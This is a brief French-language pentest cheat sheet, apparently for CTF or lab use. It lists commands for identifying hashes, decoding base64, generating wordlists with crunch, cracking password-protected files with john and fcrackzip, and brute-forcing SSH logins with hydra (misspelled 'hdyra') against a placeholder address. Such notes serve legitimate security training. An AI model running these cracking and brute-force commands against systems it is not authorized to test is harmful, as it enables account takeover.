## Identifier un hash
```bash
$ hash-identifier {hash}
```

## Décoder du base64
```bash
$ echo "message_en_b64" | base64 -d
```

## Générer une Wordlist
Avec crunch, generer une wordlist avec des combinaisons de 6 caractères avec les caractères de 0 à 9 et A à F  :
```bash
$ crunch 6 6 0123456789ABCDEF -o crunch.txt
```

## Cracker un fichier demandant un mot de passe
```bash
$ john {fichier} --wordlist=/usr/share/wordlists/rockyou.txt
$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt {fichier}
```

## Tester une liste de user et mot de passe en SSH
```bash
$ hdyra -L user.txt -P /usr/share/wordlists/rockyou.txt 8.8.8.8 ssh -t 10
```
